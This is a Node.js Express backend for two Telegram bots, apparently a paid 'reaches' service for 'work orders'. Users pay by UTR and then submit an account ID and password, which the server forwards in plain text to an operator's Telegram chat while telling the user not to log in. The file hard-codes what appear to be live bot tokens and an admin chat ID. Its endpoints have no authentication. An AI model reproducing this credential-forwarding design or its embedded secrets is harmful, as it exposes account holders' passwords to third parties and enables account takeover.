const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(cors());

// ==========================================
// 1. CONFIGURATION & CREDENTIALS
// ==========================================
const CUSTOMER_BOT_TOKEN = '8874503246:AAEmdPcVJMQ3q6pmINsP_Tcwium3ANV4T6I';
const ADMIN_BOT_TOKEN = '8787715855:AAF9PLZkk_tOb28TYcyTcAs_NszwURnzhkw';
const ADMIN_CHAT_ID = '7659178694';
const MINI_APP_URL = 'https://jpw-mini-app-front-end.vercel.app/';

// Initialize Bot Instances
const customerBot = new TelegramBot(CUSTOMER_BOT_TOKEN, { polling: true });
const adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

// In-Memory Database Simulation
let users = {}; 
let pendingTransactions = {}; 

// Catch Polling Errors to prevent server crash
customerBot.on('polling_error', (error) => console.error('[Customer Bot Error]', error.code || error.message));
adminBot.on('polling_error', (error) => console.error('[Admin Bot Error]', error.code || error.message));

// ==========================================
// 2. TELEGRAM CUSTOMER BOT HANDLERS
// ==========================================
customerBot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || 'User';

    const welcomeMessage = `✨ *Welcome, ${firstName}!*\n\nWelcome to *JPW REACHED SERVICES BOT*.\nClick the button below to launch the Mini App and manage your reaches!`;

    customerBot.sendMessage(chatId, welcomeMessage, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: '🚀 Open App',
                        web_app: { url: MINI_APP_URL }
                    }
                ]
            ]
        }
    }).catch(err => console.error("[Error] Customer Bot /start send failed:", err.message));
});

// ==========================================
// 3. TELEGRAM ADMIN BOT HANDLERS (Callback)
// ==========================================
adminBot.on('callback_query', async (query) => {
    const action = query.data;
    const msg = query.message;
    const parts = action.split('_');
    const type = parts[0];
    const utrNumber = parts[1];

    const tx = pendingTransactions[utrNumber];

    if (!tx) {
        await adminBot.answerCallbackQuery(query.id, { text: "Transaction already processed or expired!" }).catch(() => {});
        return;
    }

    const { telegramId, reachesToAdd } = tx;

    if (type === 'accept') {
        if (!users[telegramId]) users[telegramId] = { reaches: 0 };
        users[telegramId].reaches += reachesToAdd;
        const totalUserReaches = users[telegramId].reaches;

        const successReportMsg = `
✅ *REACHED SUCCESSFULLY*

👤 Tech ID: \`${telegramId}\`
📊 Status: SUCCESS
📍 Remaining Reaches: \`${totalUserReaches}\`

📋 Work Orders Processed Successfully.
        `.trim();

        try {
            await customerBot.sendMessage(telegramId, successReportMsg, { parse_mode: 'Markdown' });
        } catch (e) {
            console.error("[Error] Failed to send success message to user:", e.message);
        }

        await adminBot.editMessageText(`✅ *Accepted & Processed*\n\n👤 User: \`${telegramId}\`\n📦 Added: ${reachesToAdd} Reaches\n🆔 UTR: \`${utrNumber}\``, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'Markdown'
        }).catch(() => {});

        delete pendingTransactions[utrNumber];

    } else if (type === 'reject') {
        try {
            await customerBot.sendMessage(telegramId, `❌ *Payment Rejected*\n\nYour payment (UTR: \`${utrNumber}\`) was rejected. Please verify your UTR or contact support.`, { parse_mode: 'Markdown' });
        } catch (e) {
            console.error("[Error] Failed to send reject message to user:", e.message);
        }

        await adminBot.editMessageText(`❌ *Rejected*\n\n👤 User: \`${telegramId}\`\n🆔 UTR: \`${utrNumber}\``, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'Markdown'
        }).catch(() => {});

        delete pendingTransactions[utrNumber];
    }

    await adminBot.answerCallbackQuery(query.id, { text: "Action processed!" }).catch(() => {});
});

// ==========================================
// 4. BACKEND API ENDPOINTS
// ==========================================

// Health Check Endpoint
app.get('/', (req, res) => {
    res.send('JPW Reached Services Backend Server is Active & Running Smoothly!');
});

// Endpoint 1: Initialize User Profile
app.post('/api/user/init', (req, res) => {
    const { telegramId } = req.body;
    if (!telegramId) return res.status(400).json({ success: false, error: "Telegram ID required" });

    if (!users[telegramId]) {
        users[telegramId] = { reaches: 0 };
    }
    res.json({ success: true, user: users[telegramId] });
});

// Endpoint 2: Request Purchase (UTR Submission)
app.post('/api/request-purchase', async (req, res) => {
    const { telegramId, packageId, utrNumber } = req.body;

    if (!telegramId || !utrNumber) {
        return res.status(400).json({ success: false, error: "Missing required fields" });
    }

    let reachesToAdd = 1;
    let amount = 20;
    if (packageId === 'pack_3') { reachesToAdd = 3; amount = 55; }
    else if (packageId === 'pack_6') { reachesToAdd = 6; amount = 100; }
    else if (packageId === 'pack_14') { reachesToAdd = 14; amount = 200; }

    pendingTransactions[utrNumber] = { telegramId, packageId, reachesToAdd };

    // Send instant "In Process" alert to Customer
    try {
        await customerBot.sendMessage(telegramId, `⏳ *Payment Received*\n\nYour UTR (\`${utrNumber}\`) has been submitted successfully.\n*Status:* In Process. Admin is verifying your payment.`, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error("[Error] Customer alert failed (Did user start bot?):", e.message);
    }

    // Send Notification with Accept/Reject buttons to Admin Bot
    const adminMsg = `🔔 *New Payment Request*\n\n👤 User ID: \`${telegramId}\`\n📦 Package: ${reachesToAdd} Reaches\n💰 Amount: ₹${amount}\n🆔 UTR: \`${utrNumber}\``;

    try {
        await adminBot.sendMessage(ADMIN_CHAT_ID, adminMsg, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: `accept_${utrNumber}` },
                        { text: '❌ Reject', callback_data: `reject_${utrNumber}` }
                    ]
                ]
            }
        });
    } catch (err) {
        console.error("[Error] Admin notification failed:", err.message);
    }

    res.json({ success: true, message: "Request successfully sent to admin!" });
});

// Endpoint 3: Submit Credentials & Queue Status
app.post('/api/submit-credentials', async (req, res) => {
    const { telegramId, targetId, targetPassword, workOrders, time, queueInfo, estimatedTime } = req.body;

    if (!telegramId || !targetId || !targetPassword) {
        return res.status(400).json({ success: false, error: "All fields are required" });
    }

    if (!users[telegramId] || users[telegramId].reaches <= 0) {
        return res.json({ success: false, error: "Insufficient reaches! Please buy more reaches." });
    }

    // Deduct 1 reach
    users[telegramId].reaches -= 1;
    const remainingReaches = users[telegramId].reaches;

    // Send Credentials to Admin Bot
    try {
        await adminBot.sendMessage(ADMIN_CHAT_ID, `📤 *New Credentials Submitted*\n\n👤 User ID: \`${telegramId}\`\n🔑 Target ID: \`${targetId}\`\n🔒 Password: \`${targetPassword}\``, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error("[Error] Admin credentials notify failed:", e.message);
    }

    // Queue Status Notification to Customer
    const formattedQueueMsg = `
🤖 *JPW REACHED SERVICES BOT STATUS*

✅ Status: Queued
👤 User ID: \`${targetId || telegramId}\`
⏰ Time: ${time || 'Just now'}

📍 Queue Position: ${queueInfo || '1/1'}
⏳ Action Required: Please do not log in to your ID. Estimated wait time: ${estimatedTime || '1.5 min'}.

📋 Work Orders:
${workOrders && Array.isArray(workOrders) ? workOrders.map((wo, index) => `${index === 0 ? '  🎯 ' : '  • '}${wo}`).join('\n') : '  • N/A'}

🔄 Status: Processing...
`.trim();

    try {
        await customerBot.sendMessage(telegramId, formattedQueueMsg, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error("[Error] Customer queue message failed:", e.message);
    }

    res.json({ 
        success: true, 
        message: "Submitted Successfully!",
        remainingReaches: remainingReaches 
    });
});

// ==========================================
// 5. SERVER START
// ==========================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
